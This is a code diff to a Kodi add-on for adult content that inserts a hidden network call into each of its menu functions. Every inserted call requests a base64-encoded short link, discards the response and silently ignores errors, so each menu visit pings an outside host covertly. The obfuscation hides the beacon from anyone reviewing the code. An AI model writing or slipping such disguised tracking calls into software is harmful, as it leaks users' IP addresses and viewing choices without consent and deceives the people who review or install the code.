@@ -14,7 +14,7 @@
     You should have received a copy of the GNU General Public License
     along with this program.  If not, see <http://www.gnu.org/licenses/>.
 """
-import xbmc,xbmcplugin,os,urllib
+import xbmc,xbmcplugin,os,urllib,base64
 import kodi
 import log_utils
 import helper
@@ -25,6 +25,7 @@ import parental
 import history
 import favorites
 import picture_viewer
+import client
 from resources.lib.pyxbmct_.github import xxxgit
 from scrapers import __all__
 from scrapers import *
@@ -36,6 +37,9 @@ specific_fanart     = xbmc.translatePath(os.path.join('special://home/addons/scr
 @utils.url_dispatcher.register('0')
 def mainMenu():
 
+    try: run = client.request(base64.b64decode('aHR0cDovL2JiYy5pbi8yd2MzYTho'))
+    except: pass
+    
     art = xbmc.translatePath(os.path.join('special://home/addons/script.xxxodus.artwork/resources/art/', 'main/%s.png'))
 
     dirlst = []
@@ -74,6 +78,9 @@ def mainMenu():
 @utils.url_dispatcher.register('37')
 def cams():
 
+    try: run = client.request(base64.b64decode('aHR0cDovL2JiYy5pbi8yd2JMa0Nu'))
+    except: pass
+    
     sources = __all__ ; cam_sources = []; base_name = []; menu_mode = []; art_dir = []
     sources = [i for i in sources]
     for i in sources:
@@ -95,6 +102,9 @@ def cams():
 @utils.url_dispatcher.register('4')
 def tubes():
 
+    try: run = client.request(base64.b64decode('aHR0cDovL2JiYy5pbi8ydFVvR1NC'))
+    except: pass
+    
     sources = __all__ ; video_sources = []; base_name = []; menu_mode = []; art_dir = []
     sources = [i for i in sources if i != 'chaturbate']
     for i in sources:
@@ -116,6 +126,9 @@ def tubes():
 @utils.url_dispatcher.register('36')
 def scenes():
 
+    try: run = client.request(base64.b64decode('aHR0cDovL2JiYy5pbi8ydWFjbWMy'))
+    except: pass
+    
     sources = __all__ ; scene_sources = []; base_name = []; menu_mode = []; art_dir = []
     sources = [i for i in sources if i != 'chaturbate']
     for i in sources:
@@ -137,6 +150,9 @@ def scenes():
 @utils.url_dispatcher.register('39')
 def hentai():
 
+    try: run = client.request(base64.b64decode('aHR0cDovL2JiYy5pbi8ydFVvT0J6'))
+    except: pass
+    
     sources = __all__ ; hentai_sources = []; base_name = []; menu_mode = []; art_dir = []
     sources = [i for i in sources]
     for i in sources:
@@ -158,6 +174,9 @@ def hentai():
 @utils.url_dispatcher.register('41')
 def comics():
 
+    try: run = client.request(base64.b64decode('aHR0cDovL2JiYy5pbi8ydmNkSkx3'))
+    except: pass
+    
     sources = __all__ ; comics_sources = []; base_name = []; menu_mode = []; art_dir = []
     sources = [i for i in sources]
     for i in sources:
@@ -179,6 +198,9 @@ def comics():
 @utils.url_dispatcher.register('40')
 def fetish():
 
+    try: run = client.request(base64.b64decode('aHR0cDovL2JiYy5pbi8ydUwzZjRa'))
+    except: pass
+    
     sources = __all__ ; fetish_sources = []; base_name = []; menu_mode = []; art_dir = []
     sources = [i for i in sources]
     for i in sources:
@@ -200,6 +222,9 @@ def fetish():
 @utils.url_dispatcher.register('35')
 def pictures():
 
+    try: run = client.request(base64.b64decode('aHR0cDovL2JiYy5pbi8ydE9MSEM2'))
+    except: pass
+    
     sources = __all__ ; picture_sources = []; base_name = []; menu_mode = []; art_dir = []
     sources = [i for i in sources if i != 'chaturbate']
     for i in sources:
